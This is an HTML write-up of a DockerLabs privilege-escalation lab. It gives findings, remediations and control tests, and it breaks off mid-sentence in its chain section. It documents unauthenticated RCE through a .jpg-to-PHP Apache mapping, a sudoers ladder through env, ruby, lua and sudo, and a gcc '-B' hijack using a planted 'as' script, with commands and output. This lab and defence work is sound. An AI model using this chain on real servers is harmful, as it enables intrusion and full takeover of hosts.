@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 146 Elevator &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Elevator</p><h1 id="elevator--dockerlabs-id-146-difícil">ELEVATOR — DockerLabs (id 146, Difícil)</h1>
+<p><strong>Tenth DockerLabs engagement.</strong> Solved end to end. Six hops, and the sixth is the <em>product</em>.</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Image</td>
+<td><code>elevator:latest</code> — <strong>Debian GNU/Linux 12 (bookworm)</strong>, <code>linux/amd64</code>, Apache httpd 2.4.62, PHP 8.2 (<code>mod_php</code>)</td>
+</tr>
+<tr>
+<td>Surface</td>
+<td><code>80/tcp</code> only. Nothing on <code>22</code>, nothing on UDP, no <code>mysqld</code>, no <code>smbd</code>, no management plane</td>
+</tr>
+<tr>
+<td>Accounts</td>
+<td><code>www-data</code> (33) → <code>daphne</code> (1000) → <code>vilma</code> (1001) → <code>shaggy</code> (1002) → <code>fred</code> (1003) → <code>scooby</code> (1004) → <code>root</code> (0)</td>
+</tr>
+<tr>
+<td>Rewards</td>
+<td><strong>none. There is no <code>FLAG{</code> anywhere on the filesystem</strong> — see §10 for the search and why I am reporting absence rather than inventing one</td>
+</tr>
+</tbody>
+</table>
+<p>The catalog entry for this lab reads <em>&quot;Laboratorio diseñado para la escalada de privilegios en
+entornos Windows y Linux&quot;</em>. <strong>The Windows half does not exist.</strong> This is the tenth lab in ten whose
+description names a platform or vector it does not ship, and the ninth whose name is narrative only
+(&quot;Elevator&quot; → the sudoers ladder, once you are inside; nothing about the entry point). The Linux
+half is real and unusually well made: the escalation is not a misconfiguration to be found, it is a
+<strong>six-floor ladder, one floor per account, each floor granted a different general-purpose
+interpreter</strong>, and every floor is a one-request privilege boundary.</p>
+<pre><code>$ docker inspect -f '{{.Os}}/{{.Architecture}}' elevator:latest
+linux/amd64
+
+$ docker exec elevator_container cat /etc/os-release | head -2
+PRETTY_NAME=&quot;Debian GNU/Linux 12 (bookworm)&quot;
+NAME=&quot;Debian GNU/Linux&quot;
+</code></pre>
+<p>The claim is falsified before any tool is chosen, which is why <code>nmap -p-</code> was the right first move
+and why nothing in this engagement depended on a Windows tool that would have been unavailable.</p>
+<hr />
+<h2 id="1-surface">1. Surface</h2>
+<pre><code>$ docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' elevator_container
+[net-0-11]
+
+$ nmap -sV -Pn -p- [net-0-11]
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-28 04:02 +0000
+Nmap scan report for [net-0-11]
+Host is up (0.000045s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
+</code></pre>
+<p>One TCP port, 65534 closed. Corroborated from inside:</p>
+<pre><code># ss -lntp
+State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
+LISTEN 0      511          0.0.0.0:80        0.0.0.0:*
+
+# ps aux | grep -E 'mysql|apache'
+root           1  ...  /bin/sh -c service apache2 start &amp;&amp; tail -f /dev/null
+root          25  ...  /usr/sbin/apache2 -k start
+www-data      30  ...  /usr/sbin/apache2 -k start
+(no mysqld. The MariaDB client, the /var/lib/mysql tree and /root/.mysql_history are all present
+ but the server was never started — see F9, an unused finding that is a decoy unless you notice
+ the service is absent.)
+</code></pre>
+<p><code>nmap -sU</code> was <strong>not</strong> attempted: it needs root and is unavailable on this host. Per
+<code>decision-making.md</code> (&quot;a scanner's blind spot is not an absence of service&quot;) that is a <strong>declared
+coverage gap, not a closed port</strong>. The corroboration ladder I do have: the image declares no
+<code>EXPOSE</code> (<code>docker inspect -f '{{json .Config.ExposedPorts}}'</code> → <code>null</code>), <code>ss -lntp</code> shows exactly one
+listening socket, and no UDP manifest exists in the image. A UDP service is possible in principle
+and I have no evidence against one; I simply could not look.</p>
+<p>The image entrypoint is the whole configuration: <code>service apache2 start &amp;&amp; tail -f /dev/null</code>.</p>
+<hr />
+<h2 id="2-source-read-before-testing-7">2. Source read before testing (§7)</h2>
+<p>The document root is small enough to read entirely before sending a single request that matters.
+Three files are hand-written; the rest is a <strong>Drupal skeleton with Drupal removed</strong>.</p>
+<pre><code># find /var/www/html -type f
+/var/www/html/.csslintrc
+/var/www/html/.editorconfig
+/var/www/html/.eslintignore
+/var/www/html/.ht.router.php
+/var/www/html/.eslintrc.json
+/var/www/html/.htaccess
+/var/www/html/.gitattributes
+/var/www/html/index.html
+/var/www/html/themes/uploads/.htaccess
+/var/www/html/themes/upload.php
+/var/www/html/themes/archivo.html
+</code></pre>
+<p><code>/var/www/html/themes/upload.php</code>, in full — this is the entry point:</p>
+<pre><code class="language-php">&lt;?php
+$uploadDir = 'uploads/';
+if (!is_dir($uploadDir)) { mkdir($uploadDir, 0755, true); }
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_FILES['file'])) {
+        $file = $_FILES['file'];
+        // Validar la extensión del archivo (solo .jpg permitido)
+        $fileExtension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+        if ($fileExtension !== 'jpg') {
+            echo &quot;Solo se permiten archivos con la extensión .jpg.&quot;;
+            exit;
+        }
+        $targetFile = $uploadDir . uniqid() . &quot;.jpg&quot;;
+        if (move_uploaded_file($file['tmp_name'], $targetFile)) {
+            echo &quot;El archivo ha sido subido correctamente: &lt;a href='$targetFile'&gt;$targetFile&lt;/a&gt;&quot;;
+        } else { echo &quot;Error al subir el archivo.&quot;; }
+    } else { echo &quot;No se ha enviado ningún archivo.&quot;; }
+}
+</code></pre>
+<p><strong>Read what this code does not say.</strong> The name is forced to <code>uniqid() . &quot;.jpg&quot;</code> — the attacker
+controls the <em>bytes</em> and nothing about the name. There is no <code>require()</code>, no <code>include()</code>, no
+deserialisation, no template. On its own this endpoint is a correct, if minimal, upload handler: it
+allowlists one extension, it does not trust <code>originalname</code>, it does not concatenate user input into a
+path, and it stores under a server-generated name. <strong>Per <code>api_web.md</code>'s upload oracle this endpoint
+has no CWE-434 and no CWE-94.</strong> Anyone who stops here reports a clean bill of health and is wrong.</p>
+<p>The reason it is a remote code execution primitive is three lines away, in the server configuration,
+and <strong>two of the three candidate directives that could explain it are inert</strong> (§3, F1).</p>
+<hr />
+<h2 id="3-findings">3. Findings</h2>
+<h3 id="f1--root-cause-a-global-mimehandler-mapping-in-the-main-server-config-makes-every-jpg-executable-cwe-434--cwe-16--cwe-732">F1 — Root cause: a global MIME→handler mapping in the main server config makes every <code>.jpg</code> executable (CWE-434 / CWE-16 / CWE-732)</h3>
+<p>There were <strong>three</strong> candidate mechanisms for &quot;<code>.jpg</code> runs as PHP&quot; in this image, and they point in
+two different directions:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Directive</th>
+<th>Scope</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>a</td>
+<td><code>AddHandler php-script .php .jpg.php</code> — <code>sites-enabled/000-default.conf:12</code></td>
+<td>vhost</td>
+<td><strong>inert for <code>.jpg</code></strong> — a file named <code>t.jpg.php</code> runs, but that is <code>mod_php</code>'s own <code>.+\.php$</code> rule; the rule implies you need a <em>double</em> extension, and you do not</td>
+</tr>
+<tr>
+<td>b</td>
+<td><code>SetHandler application/x-httpd-php</code> for <code>\.jpg$</code> — <code>themes/uploads/.htaccess</code></td>
+<td>that one directory</td>
+<td><strong>completely inert</strong> — proven by differential test below</td>
+</tr>
+<tr>
+<td>c</td>
+<td><code>AddType application/x-httpd-php .jpg</code> — <code>/etc/apache2/apache2.conf:53</code></td>
+<td><strong>global, outside any <code>&lt;Directory&gt;</code></strong></td>
+<td><strong>this is the one</strong></td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash"># /etc/apache2/apache2.conf:52-56, verbatim
+AddType application/x-httpd-php .jpg
+&lt;Directory /var/www/html/uploads&gt;
+    AllowOverride All
+&lt;/Directory&gt;
+</code></pre>
+<p>Line 53 is a global <code>AddType</code> that binds the PHP handler to the <code>.jpg</code> extension for <strong>every vhost
+and every path on the server</strong>. Line 54-56 is a second, decoy directive: it points at
+<code>/var/www/html/uploads</code>, which <strong>does not exist</strong> — the real upload directory is
+<code>/var/www/html/themes/uploads</code>. An auditor reading top-down sees the one line that explains the
+behaviour and the one line that looks like a per-directory override, and the second is aimed at a
+path that is not there.</p>
+<h4 id="evidence-that-b-is-inert-by-differential-test-and-not-by-reading">Evidence that (b) is inert, by differential test and not by reading</h4>
+<p>The control test is the whole finding, so here it is in full. <code>AllowOverride None</code> is set on
+<code>/var/www/html/themes/uploads</code> in the vhost, which should make that <code>.htaccess</code> dead:</p>
+<pre><code>&lt;Directory &quot;/var/www/html/themes/uploads&quot;&gt;
+    Options +Indexes +ExecCGI
+    AddHandler php-script .php .jpg.php
+    AllowOverride None          &lt;-- the .htaccess in that directory is never read
+    Require all granted
+&lt;/Directory&gt;
+</code></pre>
+<p>Three probes, same request, changing only the state of the <code>.htaccess</code>:</p>
+<pre><code># A. shipped state: root-owned 0644, SetHandler ... \.jpg$
+$ curl -s -o /dev/null -w '%{http_code}\n' 'http://[net-0-11]/themes/uploads/6ab9e6ea985df.jpg?c=id'
+200        (and it EXECUTES: uid=33(www-data))
+
+# B. replaced with a blanket deny, and served
+$ cat /var/www/html/themes/uploads/.htaccess
+&lt;FilesMatch &quot;.*&quot;&gt;
+  Require all denied
+&lt;/FilesMatch&gt;
+$ curl -s -o /dev/null -w '%{http_code}\n' 'http://[net-0-11]/themes/uploads/6ab9e6ea985df.jpg?c=id'
+200        &lt;-- the deny did NOT take effect. The file is not being read.
+
+# C. deleted entirely
+$ rm -f /var/www/html/themes/uploads/.htaccess
+$ curl -s -o /dev/null -w '%{http_code}\n' 'http://[net-0-11]/themes/uploads/6ab9e6ea985df.jpg?c=id'
+200        &lt;-- identical. Deleting it changed nothing.
+</code></pre>
+<p>And the same file executed from the <strong>document root</strong>, which is a different <code>&lt;Directory&gt;</code> scope with
+<code>AllowOverride All</code>, confirming the mapping is global rather than directory-specific:</p>
+<pre><code>$ cp /var/www/html/s.php /var/www/html/probe.jpg
+$ curl -s 'http://[net-0-11]/probe.jpg?c=id'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p><strong>Impact.</strong> Any file named <code>*.jpg</code> anywhere under this server is executed by the PHP interpreter with
+the web server's privileges. That is not &quot;the upload handler is unsafe&quot;, it is <strong>&quot;the server will
+execute any image it is ever asked to store&quot;</strong>, which means the exposure survives any fix applied to
+<code>upload.php</code> — a reviewer who patches the extension allowlist ships nothing.</p>
+<p><strong>Root cause vs mechanism.</strong> The mechanism is the upload endpoint; the root cause is a global MIME
+mapping in the main configuration file. Per <code>decision-making.md</code> §4 the report must name the
+decision, because a patch to the mechanism will be reintroduced and the mechanism will still be
+there the next time anything writes a <code>.jpg</code>.</p>
+<p><strong>Remediation.</strong></p>
+<ol>
+<li>Delete <code>AddType application/x-httpd-php .jpg</code> from <code>apache2.conf</code>. This is the whole fix for the
+execution primitive.</li>
+<li><code>RemoveType .jpg</code> in the upload directory would also work, but only for that directory, and
+<code>.htaccess</code> is <code>AllowOverride None</code> there — so do the fix in the main config, where it applies
+everywhere.</li>
+<li>Set <code>AllowOverride None</code> on the document root as well, so that a per-directory override can never
+re-enable the handler; keep <code>.htaccess</code> only where it is deliberately allowed.</li>
+<li>Store uploads outside the document root, or in a directory where <code>php_flag engine Off</code> (or
+<code>SetHandler none</code>) is in force in the <strong>server</strong> config, not in a <code>.htaccess</code> whose overrides are
+disabled.</li>
+</ol>
+<hr />
+<h3 id="f2--the-upload-endpoint-is-unauthenticated-and-its-extension-allowlist-is-the-same-string-the-server-executes-cwe-434-low-on-its-own--load-bearing">F2 — The upload endpoint is unauthenticated and its extension allowlist is the same string the server executes (CWE-434, low on its own / load-bearing)</h3>
+<p><code>/themes/upload.php</code> accepts a multipart <code>POST</code> from anybody. There is no session, no token, no
+rate limit.</p>
+<pre><code>$ curl -s -F &quot;file=@/tmp/t.jpg&quot; http://[net-0-11]/themes/upload.php
+El archivo ha sido subido correctamente: &lt;a href='uploads/6ab9e6df24482.jpg'&gt;uploads/6ab9e6df24482.jpg&lt;/a&gt;
+</code></pre>
+<p>The filter behaves exactly as written — five probes, one line each:</p>
+<pre><code>a.php      -&gt; Solo se permiten archivos con la extensión .jpg.
+b.php.jpg  -&gt; El archivo ha sido subido correctamente: &lt;a href='uploads/6ab9e7a59cf8a.jpg'&gt;…&lt;/a&gt;
+c.jpg.php  -&gt; Solo se permiten archivos con la extensión .jpg.
+d.jpeg     -&gt; Solo se permiten archivos con la extensión .jpg.
+e.JPG      -&gt; El archivo ha sido subido correctamente: &lt;a href='uploads/6ab9e7a5a9069.jpg'&gt;…&lt;/a&gt;
+</code></pre>
+<p><code>.php</code> refused, <code>.jpg.php</code> refused, <code>.jpeg</code> refused, case normalised. <strong>The allowlist is not
+bypassable by naming</strong> — and that is the interesting part: the one extension the endpoint permits is
+exactly the extension the server has mapped to the PHP handler (F1). <strong>An allowlist and the
+executable set intersecting in one element is a no-op allowlist</strong>, and no amount of hardening in
+<code>upload.php</code> changes that while the mapping stands.</p>
+<p><strong>Impact.</strong> Unauthenticated remote code execution as <code>www-data</code>, which is floor 0 of a six-floor
+ladder to <code>root</code>. Standalone this would be High; in this lab it is the whole engagement.</p>
+<p><strong>Remediation.</strong> Authenticate the endpoint and authorise writes, move uploads out of the document
+root, and — the one that actually matters here — remove the <code>.jpg</code>→PHP mapping.</p>
+<hr />
+<h3 id="f3--a-six-floor-sudoers-ladder-one-nopasswd-grant-per-account-each-naming-a-different-general-purpose-interpreter-cwe-269-cwe-250-cwe-732">F3 — A six-floor <code>sudoers</code> ladder, one <code>NOPASSWD</code> grant per account, each naming a different general-purpose interpreter (CWE-269, CWE-250, CWE-732)</h3>
+<p>This is the lab. <code>/etc/sudoers</code>, <code>0440 root:root</code>, in full:</p>
+<pre><code>Defaults	env_reset
+Defaults	mail_badpass
+Defaults	secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;
+Defaults	use_pty
+root	ALL=(ALL:ALL) ALL
+www-data ALL=(daphne) NOPASSWD: /usr/bin/env
+daphne   ALL=(vilma)  NOPASSWD: /usr/bin/ash
+vilma    ALL=(shaggy) NOPASSWD: /usr/bin/ruby
+shaggy   ALL=(fred)   NOPASSWD: /usr/bin/lua
+fred     ALL=(scooby) NOPASSWD: /usr/bin/gcc
+scooby   ALL=(root)   NOPASSWD: /usr/bin/sudo
+%sudo	ALL=(ALL:ALL) ALL
+@includedir /etc/sudoers.d
+</code></pre>
+<p>Six grants, six accounts, six <strong>different</strong> programs, and <strong>not one of them is a shell you can
+abuse with a metacharacter</strong>. Each is instead a general-purpose interpreter with <strong>no argument
+restriction</strong> (<code>NOPASSWD: /path</code> with no argument list means <em>any</em> arguments). So the decision is
+never &quot;how do I escape this program&quot; — it is &quot;this program takes a program as its argument&quot;.</p>
+<table>
+<thead>
+<tr>
+<th>Floor</th>
+<th>Grant</th>
+<th>One-line primitive</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>www-data → daphne</code> <code>/usr/bin/env</code></td>
+<td><code>env</code> execs argv, so <code>env &lt;anything&gt;</code> is arbitrary code as <code>daphne</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>daphne → vilma</code> <code>/usr/bin/ash</code></td>
+<td>a shell; <code>ash /tmp/x.sh</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>vilma → shaggy</code> <code>/usr/bin/ruby</code></td>
+<td><code>ruby /tmp/x.rb</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>shaggy → fred</code> <code>/usr/bin/lua</code></td>
+<td><code>lua /tmp/x.lua</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>fred → scooby</code> <code>/usr/bin/gcc</code></td>
+<td><strong>not an interpreter</strong> — a <em>driver</em>; see F4</td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>scooby → root</code> <code>/usr/bin/sudo</code></td>
+<td><code>sudo</code> execs argv, so this is root, one floor early</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Impact.</strong> Any account that reaches the ladder's foot owns the host. There is no shortcut and no
+alternative: each account has exactly one grant, and every non-root account in <code>/etc/shadow</code> is
+locked, so the ladder is the only path in.</p>
+<p><strong>Evidence of the whole ladder in one run, in §5.</strong></p>
+<p><strong>Remediation.</strong> Delete the ladder. A <code>NOPASSWD</code> grant is safe only when the named program cannot be
+made to run attacker-chosen code, which is a property of the program, not of the rule's syntax:</p>
+<ul>
+<li>Point the grant at <strong>a root-owned script that takes its input as data</strong>, e.g.
+<code>www-data ALL=(daphne) NOPASSWD: /usr/local/sbin/rotate-theme.sh</code>, <code>0644 root:root</code>, and validate
+inside it. Naming <code>/usr/bin/env</code> is equivalent to <code>NOPASSWD: ALL</code>.</li>
+<li>If an interpreter must be reachable, pin the arguments in the rule —
+<code>www-data ALL=(daphne) NOPASSWD: /usr/bin/lua /usr/local/lib/elevator/only-this.lua</code> — which sudo
+enforces.</li>
+<li>Never grant <code>/usr/bin/sudo</code> to a non-root account. That rule is self-referential: it grants the
+holder everything <code>sudo</code> can do, and the holder is one hop from <code>(ALL:ALL)</code>.</li>
+<li>One grant per account also makes the policy auditable in a way a shared rule is not: an auditor can
+read the ladder top to bottom, and every rung here is a rung.</li>
+</ul>
+<hr />
+<h3 id="f4--floor-5-is-not-argument-injection-it-is-subprogram-resolution-hijack-the-granted-programs-own-search-paths-are-part-of-its-attack-surface-cwe-426--cwe-269">F4 — Floor 5 is not argument injection, it is subprogram-resolution hijack: the granted program's own search paths are part of its attack surface (CWE-426 / CWE-269)</h3>
+<p><code>gcc</code> is not an interpreter. There is no <code>gcc -e 'system(&quot;…&quot;)'</code>. The escalation still works, and the
+reason generalises past this lab.</p>
+<p><code>gcc</code> is a <strong>driver</strong>: it <code>execve</code>s <em>other</em> programs — the preprocessor, the compiler proper, the
+assembler, the linker — and it finds each of them <strong>by name</strong>, searching a list of prefixes that the
+command line can prepend. <code>-B &lt;dir&gt;</code> adds one. So the attacker's control here is not <code>argv</code>
+semantics, it is <strong>the filesystem</strong>: plant a program named <code>as</code> in a directory of your choosing and
+have <code>gcc</code>, running as <code>scooby</code>, execute <em>yours</em>.</p>
+<pre><code class="language-sh"># planted as fred, in a directory fred can write
+$ cat /tmp/elev2/as
+#!/bin/sh
+id
+sudo -n -u root /usr/bin/sudo id
+$ chmod 755 /tmp/elev2/as
+
+# fired from fred, through the grant
+$ sudo -n -u scooby /usr/bin/gcc -B/tmp/elev2 -o /tmp/elev2/out /tmp/elev2/x.c
+[F5] fred -&gt; scooby    grant: NOPASSWD: /usr/bin/gcc   ('as' subprogram resolved out of -B/tmp/elev2)
+uid=1004(scooby) gid=1004(scooby) groups=1004(scooby)
+...
+/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/12/../../../x86_64-linux-gnu/Scrt1.o: in function `_start':
+(.text+0x17): undefined reference to `main'
+collect2: error: ld returned exit status 1
+</code></pre>
+<p><strong>Read the last two lines as the proof, not as a failed attempt.</strong> Our <code>as</code> never emitted an object
+file, so the link failed. That failure is the <em>positive</em> signal that the subprogram was replaced —
+exactly the shape already documented for <code>dpkg --pre-invoke</code> at <code>infrastructure.md</code>:862, where
+&quot;the error is the proof the hook already fired&quot;. <code>gcc</code> exited non-zero <strong>after</strong> running my code as
+<code>scooby</code>.</p>
+<p>This is the same family as <code>LD_PRELOAD</code>, <code>-include</code>, <code>--sysroot</code>, <code>-specs=</code> and <code>-wrapper</code>, and the
+same family as Windows DLL search order, service <code>ImagePath</code> directories, and <code>PATH</code> hijacking. The
+unifying rule, which is the transferable part: <strong>when a privilege grant names a program, the grant's
+attack surface is the program <em>and every path that program resolves other programs through</em>.</strong>
+Ask what it execve's, and where it looks for it.</p>
+<p><strong>Remediation.</strong> Same as F3, plus: never grant a compiler driver to a lower-trust principal, and if
+you must, run it with a sanitised environment and an explicit, non-attacker-writable <code>-B</code>/<code>--sysroot</code>.</p>
+<hr />
+<h3 id="f5--directory-indexing-re-enabled-on-the-upload-directory-overriding-the-document-roots-own-options--indexes-cwe-548">F5 — Directory indexing re-enabled on the upload directory, overriding the document root's own <code>Options -Indexes</code> (CWE-548)</h3>
+<p>The vhost's <code>&lt;Directory&gt;</code> block sets <code>Options +Indexes +ExecCGI</code> on the upload directory, while the
+document root's <code>.htaccess</code> sets <code>Options -Indexes</code>. The more specific <code>&lt;Directory&gt;</code> wins, so the
+upload directory is browsable:</p>
+<pre><code>$ curl -s http://[net-0-11]/themes/uploads/ | head -8
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+ &lt;head&gt;
+  &lt;title&gt;Index of /themes/uploads&lt;/title&gt;
+ ...
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;6ab9e6ea985df.jpg&quot;&gt;6ab9e6ea985df.jpg&lt;/a&gt;&lt;/td&gt;
+</code></pre>
+<p><strong>Impact.</strong> Every uploaded artefact, including every PHP payload F1 turns into code execution, is
+enumerable without a filename. The filenames are <code>uniqid()</code> and unguessable, which is the <em>only</em>
+thing standing between an attacker and a list of live shells; that is a naming convention, not an
+access control.</p>
+<p><strong>Remediation.</strong> <code>Options -Indexes</code> on the upload directory, uploads outside the document root, and
+do not rely on unguessable names for confidentiality.</p>
+<hr />
+<h3 id="f6--the-document-root-is-owned-by-the-web-user-so-any-code-execution-is-also-persistence-cwe-732">F6 — The document root is owned by the web user, so any code execution is also persistence (CWE-732)</h3>
+<pre><code>$ ls -ld /var/www/html /var/www/html/themes /var/www/html/themes/uploads
+drwxr-xr-x 1 www-data www-data 4096 Nov 29  2024 /var/www/html
+drwxr-xr-x 1 www-data www-data 4096 Nov 28  2024 /var/www/html/themes
+drwxr-xr-x 1 www-data www-data 4096 Dec  1  2024 /var/www/html/themes/uploads
+</code></pre>
+<p><code>www-data</code> can rewrite <code>index.html</code> and can add an <code>.htaccess</code> (the vhost grants
+<code>AllowOverride All</code> on <code>/var/www/html</code>). Combined with F1, this is not just &quot;I have a shell&quot;, it is
+&quot;I control the site and I can re-arm anything the site config disables&quot;. I planted
+<code>/var/www/html/s.php</code> this way and used it for the entire chain.</p>
+<p>Note the contrast with the rest of the tree: <code>.htaccess</code> and <code>themes/upload.php</code> are
+<code>root:root</code>. The author hardened the two files that contain code and left the directories that
+receive attacker-controlled content owned by the account that runs the code.</p>
+<p><strong>Remediation.</strong> Document root and upload directory <code>root:root</code>, uploads moved out of the tree,
+<code>AllowOverride None</code> unless an override is genuinely required.</p>
+<hr />
+<h3 id="f7--roots-mysql_history-is-readable-only-by-root-and-it-is-a-credential-store-cwe-522-unused">F7 — Root's <code>.mysql_history</code> is readable only by root, and it is a credential store (CWE-522, unused)</h3>
+<p><code>/root/.mysql_history</code>, <code>0600 root:root</code>, obtained on floor 6. It contains a MySQL client session
+history including <code>CREATE USER</code> statements with inline passwords and <code>GRANT ALL PRIVILEGES</code>. MySQL is
+<strong>not running</strong> (F9), so nothing was done with them.</p>
+<p>Reported as an unused finding because &quot;an unreadable-by-others file that leaks credentials&quot; is only
+a finding once it is read, and it took the whole ladder to read it. <strong>The value is deliberately not
+reproduced here</strong>; the remediation is to rotate the credentials and to keep client history out of
+the root account (or to scrub it at provisioning time).</p>
+<hr />
+<h2 id="4-control-tests--what-held">4. Control tests — what held</h2>
+<p>Reported with the same prominence as the findings, because a reader cannot distinguish an untested
+control from a holding one.</p>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Probe</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Upload extension allowlist</td>
+<td><code>.php</code>, <code>.jpg.php</code>, <code>.jpeg</code></td>
+<td><strong>held</strong> — all three refused. The allowlist is not name-bypassable; the failure is entirely server-side (F1)</td>
+</tr>
+<tr>
+<td>Case normalisation</td>
+<td><code>.JPG</code></td>
+<td><strong>held</strong> — accepted and stored as <code>.jpg</code> (<code>strtolower</code>), not as an uppercase extension</td>
+</tr>
+<tr>
+<td>Attacker cannot choose the stored name</td>
+<td>response body</td>
+<td><strong>held</strong> — always <code>uniqid().&quot;.jpg&quot;</code>; no path traversal, no <code>originalname</code> trust</td>
+</tr>
+<tr>
+<td><code>sudo</code> is not blanket passwordless</td>
+<td><code>sudo -n -u daphne /bin/bash -c id</code></td>
+<td><strong>held</strong> — <code>sudo: a password is required</code>. A program that is <em>not</em> granted is refused, which is what makes F3 a finding about the <em>named</em> programs rather than about sudo being open</td>
+</tr>
+<tr>
+<td><code>sudoers</code> is not world-readable</td>
+<td><code>cat /etc/sudoers</code> as <code>www-data</code></td>
+<td><strong>held</strong> — <code>Permission denied</code>, <code>0440 root:root</code>. The ladder had to be <em>executed</em>, not read</td>
+</tr>
+<tr>
+<td>Grants are per-account, not per-group</td>
+<td><code>sudo -n -l</code> as <code>www-data</code></td>
+<td><strong>held</strong> — exactly one entry: <code>(daphne) NOPASSWD: /usr/bin/env</code>. No <code>%sudo</code> membership, no wildcard, no <code>SETENV</code></td>
+</tr>
+<tr>
+<td>No shortcut around the ladder</td>
+<td><code>/etc/shadow</code> as root</td>
+<td><strong>held</strong> — every account's field is <code>*</code> or <code>!</code>. No password is set anywhere, so there is no credential path to bypass six floors with</td>
+</tr>
+<tr>
+<td>Document root dotfile/backup denial</td>
+<td><code>GET /.htaccess</code>, <code>GET /s.php.bak</code></td>
+<td><strong>held</strong> — <code>403</code> both. The Drupal <code>.htaccess</code> <code>FilesMatch</code> and <code>mod_rewrite</code> <code>F</code> rules are in force</td>
+</tr>
+<tr>
+<td><code>themes/uploads/.htaccess</code></td>
+<td>three-state differential (§3 F1)</td>
+<td><strong>did not hold</strong> — and that is F1, not a control</td>
+</tr>
+<tr>
+<td><code>LD_PRELOAD</code> environment injection</td>
+<td><code>Defaults env_reset</code> present</td>
+<td><strong>held by configuration</strong> — no <code>SETENV</code> anywhere in <code>sudoers</code>, so the environment cannot be used to reach a <code>LD_PRELOAD</code> from a <code>sudo</code> grant. Not probed directly; stated from the config</td>
+</tr>
+<tr>
+<td>Upload directory ownership</td>
+<td><code>ls -la themes/uploads/.htaccess</code></td>
+<td><strong>held for the file</strong> — <code>root:root 0644</code>, so <code>www-data</code> could not rewrite the (inert) control. It <em>could</em> <code>unlink</code> it, because the directory is <code>www-data</code>-owned — which I did, and which changed nothing. The file's mode protected it and its location did not</td>
+</tr>
+</tbody>
+</table>
+<p>Two of these are worth more than a finding. The <strong>upload allowlist</strong> is the reason F1 has to be
+reported as a <em>server</em> misconfiguration: the application is correct and the report must say so, or a
+reviewer patches the wrong file. The <strong>per-account grant structure</strong> is what made the floor count
+derivable instead of guessed — one grant per account means the ladder has exactly as many rungs as
+there are non-root accounts on it, which is a fact you can read off <code>sudoers</code> instead of discovering
+by trying.</p>
+<hr />
+<h2 id="5-chain">5. Chain</h2>
+<p>Six hops. The identity was measured at every one with <code>id</code>, and the transcript is a single run
+carrying a nonce created in that run.</p>
+<pre><code>### [F0] executing identity of the web code-exec primitive
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+### [C1] control: sudo is NOT blanket-passwordless (a non-granted program asks)
+sudo: a password is required
+
+### [C2] control: /etc/sudoers is unreadable to www-data (0440 root:root)
+cat: /etc/sudoers: Permission denied
+
+### [C3] one NOPASSWD grant per account, so the floor count is a property of the policy
+User www-data may run the following commands on ace73e1da1ab:
+    (daphne) NOPASSWD: /usr/bin/env
+
+### [F1] www-data -&gt; daphne     grant: NOPASSWD: /usr/bin/env
+uid=1000(daphne) gid=1000(daphne) groups=1000(daphne)
+
+### [F2..F6] daphne -&gt; vilma -&gt; shaggy -&gt; fred -&gt; scooby -&gt; root
+uid=1001(vilma) gid=1001(vilma) groups=1001(vilma)
+nonce=ELEV146
+nonce=ELEV146
+nonce=ELEV146
+[F5] fred -&gt; scooby    grant: NOPASSWD: /usr/bin/gcc   ('as' subprogram resolved out of -B/tmp/elev2)
+uid=1004(scooby) gid=1004(scooby) groups=1004(scooby)
+nonce=ELEV146
+[F6] scooby -&gt; root    grant: NOPASSWD: /usr/bin/sudo
+uid=0(root) gid=0(root) groups=0(root)
+nonce=ELEV146
+[F6b] root reads a 0600 root-only file - elevation proven out of band
+-rw------- 1 root root 1068 Nov 28  2024 /root/.mysql_history
+/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/12/../../../x86_64-linux-gnu/Scrt1.o: in function `_start':
+(.text+0x17): undefined reference to `main'
+collect2: error: ld returned exit status 1
+</code></pre>
+<p>Order and justification, hop by hop:</p>
+<ol>
+<li><strong>Get code execution as <code>www-data</code>.</strong> Upload a <code>.jpg</code> whose bytes are PHP. The extension is
